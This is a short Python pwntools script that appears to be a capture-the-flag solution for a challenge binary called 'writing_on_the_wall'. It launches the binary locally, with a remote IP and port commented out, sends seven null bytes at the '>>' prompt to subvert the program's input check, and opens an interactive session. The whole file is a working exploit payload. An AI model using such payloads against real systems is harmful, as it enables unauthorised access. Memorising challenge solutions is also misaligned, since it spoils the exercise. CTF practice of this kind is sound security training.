from pwn import * 

io = process("./writing_on_the_wall")

#io = remote("94.237.54.176", 40768)

io.sendlineafter(">> ", b"\x00"*7)

io.interactive()
